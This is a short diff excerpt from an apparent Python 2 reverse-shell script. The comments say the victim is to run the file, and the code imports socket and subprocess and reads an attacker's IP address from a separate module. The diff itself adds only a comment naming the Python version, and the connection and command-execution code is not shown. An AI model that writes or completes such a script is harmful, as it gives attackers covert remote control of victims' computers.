@@ -1,4 +1,5 @@
 #/usr/bin/env python
+### Use python 2.7 
 ### let victim run this file
 import socket, subprocess, attacker_info, os
 attacker_ip = attacker_info.attacker_ip      ## attacker's ip
